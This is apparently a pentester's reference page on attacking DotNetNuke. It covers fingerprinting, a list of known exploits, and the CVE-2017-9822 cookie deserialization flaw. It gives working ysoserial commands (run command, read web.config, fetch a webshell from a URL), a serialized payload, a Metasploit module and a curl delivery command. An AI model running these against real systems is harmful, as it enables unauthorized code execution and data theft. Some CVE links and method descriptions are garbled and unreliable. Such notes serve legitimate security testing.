# DotnetNuke

`DNN` (formerly `DotNetNuke`) is an open-source `Content Management System
(CMS)`, written in `C#` and based on the `.NET` framework. A number of core
features can be expended through a large panel of third-party (or
in-house) apps and modules to extend the `CMS` basic functionalities.

### Identification and discovery

###### Version disclosure

The `/Documentation/License.txt` file, if present, may hold information about
the release year of the `DotNetNuke` version being used by the webserver.

```
DotNetNuke - http://www.dotnetnuke.com
Copyright (c) 2002-2017
by DotNetNuke Corporation
[...]
```

###### Robots.txt

By default, `DotNetNuke` installation configure a verbose `robots.txt` entry,
listing a number of built-in locations.

```
Disallow: /admin/
Disallow: /App_Browsers/
Disallow: /App_Code/
Disallow: /App_Data/
Disallow: /App_GlobalResources/
Disallow: /bin/
Disallow: /Components/
Disallow: /Config/
Disallow: /contest/
Disallow: /controls/
Disallow: /DesktopModules/
Disallow: /Documentation/
Disallow: /HttpModules/
Disallow: /images/
Disallow: /Install/
Disallow: /js/
Disallow: /Portals/
Disallow: /Providers/
Disallow: /Resources/ContentRotator/
Disallow: /Resources/ControlPanel/
Disallow: /Resources/Dashboard/
Disallow: /Resources/FeedBrowser/
Disallow: /Resources/OpenForceAd/
Disallow: /Resources/Search/
Disallow: /Resources/Shared/
Disallow: /Resources/SkinWidgets/
Disallow: /Resources/TabStrip/
Disallow: /Resources/Widgets/
Disallow: /Activity-Feed/userId/	# Do not index user profiles
```

### Known vulnerabilities

###### ExploitDB exploits (as of 2021-08-08)

```
→ searchsploit DotNetNuke

DotNetNuke - Arbitrary File Upload                                                 | asp/webapps/12700.txt
DotNetNuke - Cookie Deserialization Remote Code Execution (Metasploit)             | windows/remote/48336.rb
DotNetNuke 07.04.00 - Administration Authentication Bypass                         | asp/webapps/39777.txt
DotNetNuke 4.0 - HTML Injection                                                    | asp/webapps/28615.txt
DotNetNuke 4.8.1 - Default 'ValidationKey' and 'DecriptionKey' Weak Encryption     | windows/remote/31465.cs
DotNetNuke 4.8.3 - 'Default.aspx' Cross-Site Scripting                             | asp/webapps/31865.txt
DotNetNuke 4.9.3 - 'ErrorPage.aspx' Cross-Site Scripting                           | asp/webapps/33009.txt
DotNetNuke 5.5.1 - 'InstallWizard.aspx' Cross-Site Scripting                       | asp/webapps/35045.txt
DotNetNuke 6.1.x - Cross-Site Scripting                                            | asp/webapps/38696.txt
DotNetNuke 9.3.2 - Cross-Site Scripting                                            | multiple/webapps/47449.txt
DotNetNuke 9.5 - File Upload Restrictions Bypass                                   | aspx/webapps/48125.txt
DotNetNuke 9.5 - Persistent Cross-Site Scripting                                   | aspx/webapps/48124.txt
DotNetNuke < 9.4.0 - Cross-Site Scripting                                          | multiple/webapps/47448.py
DotNetNuke DNNArticle Module 10.0 - SQL Injection                                  | php/webapps/27602.txt
DotNetNuke DNNarticle Module 11 - Directory Traversal                              | windows/webapps/44414.txt
DotNetNuke DNNspot Store 3.0.0 - Arbitrary File Upload (Metasploit)                | windows/webapps/35039.rb
DotNetNuke DreamSlider 01.01.02 - Arbitrary File Download (Metasploit)             | aspx/webapps/43405.rb
SharePoint 2007/2010 and DotNetNuke < 6 - File Disclosure (via XEE)                | windows/webapps/17873.txt
```

######  Cookie Deserialization Remote Code Execution (CVE-2017-9822)

A deserialization vulnerability is present in the `DotNetNuke (DNN)` CMS,
versions `5.0.0` to `9.3.0-RC`, which can be leveraged to remotely execute code
on the underlying system without authentication. The vulnerability lies in the
deserialization of the `DNNPersonalization` cookie (`XML` format), used to
store (authenticated or unauthenticated) user's preferences. This cookie is
notably processed during handling of `404` errors if the built-in default
`DNN`'s missing page is used.

While the object `type` to deserialize is user-controlled in the
`DNNPersonalization` cookie, the `XmlSerializer` class (used by `CNN` for the
processing) cannot be used to serialize / deserialize types with interface
members. As stated in the
[original research paper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf),
the `ObjectDataProvider` class can be used in combination with one of the
following methods:
  - `XamlReader.Load(String)`, leading to remote code execution.
  - `ObjectStateFormatter.Deserialize(String)`, leading to remote code
    execution.
  - `DotNetNuke.Common.Utilities.FileSystemUtils.PullFile(String)`, for
    arbitrary file write (for example to upload a `webshell` if a writable
    path can be found).
  - `DotNetNuke.Common.Utilities.FileSystemUtils.WriteFile(String)`, for
    arbitrary file read.

Note that the usable types may be limited to `DotNetNuke.*` classes (and thus
to arbitrary file read / write).

The initial vulnerability is identified by `CVE-2017-9822`, with a number of
bypass of the attempts at fixing the initial bug identified as
`CVE-2018-15811`, `CVE-2018-15812`, `CVE-2018-15825`, and `CVE-2018-15826`.

The following `DotNetNuke` versions are vulnerable:
  - `5.0.0 to 9.1.0`
    ([CVE-2017-9822](https://www.cvedetails.com/cve/CVE-2017-9822/))
  - `9.1.1` ([CVE-2018-15811](https://www.cvedetails.com/cve/CVE-2018-15811/))
  - `9.2 to 9.2.1`
    ([CVE-2018-15811](https://www.cvedetails.com/cve/CVE-2018-15811/))
  - `9.2.2 to 9.3.0-RC`
    ([CVE-2018-15825](https://www.cvedetails.com/cve/CVE-2018-18325) and
    [CVE-2018-15825](https://www.cvedetails.com/cve/CVE-2018-18325))

###### Metasploit module (for pre and post CVE-2017-9822 patching exploit)

The `Metasploit`'s `exploit/windows/http/dnn_cookie_deserialization_rce` module
can be used to exploit the deserialization remote code execution vulnerability,
prior to the initial patching `CVE-2017-9822` and using the subsequent bypass.

The "[How to exploit the DotNetNuke Cookie
Deserialization](https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization/)"
blog post can be consulted for information on how to exploit the vulnerability
using `metasploit` depending on the targeted version.

```
msf > use exploit/windows/http/dnn_cookie_deserialization_rce
```

###### Pre-patching exploitation (CVE-2017-9822) using ysoserial

`ysoserial.net` can be used to generate `DotNetNuke` cookies that will result
in the execution of the specified command or arbitrary read / write of the
given file against `DotNetNuke` version `5.0.0 to 9.1.0`.

```
.\ysoserial.exe -p DotNetNuke -m run_command -c "<COMMAND>"
.\ysoserial.exe -p DotNetNuke -m read_file -f "<FILE | FILE_FULL_PATH>"
.\ysoserial.exe -p DotNetNuke -m write_file -u "<FILE_TO_FETCH_URL>" -f "<FILE>"


# Retrieves the "web.config" configuration file (in its default location) in order to identify the webserver hosted directories for the upload o a webshell.
.\ysoserial.exe -p DotNetNuke -m read_file -f C:\DotNetNuke\web.config
<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\DotNetNuke\web.config</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

The generated serialized cookie can then be sent to a non-existing page using,
for example, the `curl` utility:

```
curl -i -s -k -X 'GET' \
    -b '.DOTNETNUKE=;DNNPersonalization=<SERIALIZED_PAYLOAD>' \
    'http://10.10.110.10/pagedoesnotexist123456789abc'
